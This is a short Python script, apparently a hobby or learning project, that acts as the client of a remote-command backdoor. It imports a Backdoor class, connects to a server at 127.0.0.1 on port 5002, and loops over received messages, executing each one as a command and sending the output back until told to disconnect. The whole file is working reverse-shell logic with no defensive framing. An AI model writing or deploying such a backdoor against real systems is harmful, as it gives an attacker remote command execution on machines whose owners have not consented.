from backdoor import Backdoor
import sys

door = Backdoor(server='127.0.0.1', port=5002)
door.connect()

while True:
    message = door.receiver()
    if message == door.DISCONNECT:
        print('DISCONNECT')
        door.connection.close()
        sys.exit()

    result = door.run_command(message)
    door.sender(result)
